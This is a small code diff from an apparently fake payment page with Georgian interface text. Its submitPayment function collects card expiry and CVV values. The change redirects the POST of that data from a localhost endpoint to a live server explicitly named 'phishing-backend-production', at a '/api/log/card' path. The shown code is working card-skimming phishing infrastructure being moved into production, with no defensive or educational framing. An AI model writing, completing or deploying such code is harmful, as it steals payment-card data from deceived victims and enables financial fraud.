@@ -500,7 +500,7 @@ function submitPayment() {
   const expiry = document.getElementById('card-expiry').value || '(ცარიელი)';
   const cvv = document.getElementById('card-cvv').value || '(ცარიელი)';
 
-  fetch("https://localhost:7011/api/log/card", {
+  fetch("https://phishing-backend-production-f1aa.up.railway.app/api/log/card", {
     method: "POST",
     headers: {
       "Content-Type": "application/json"
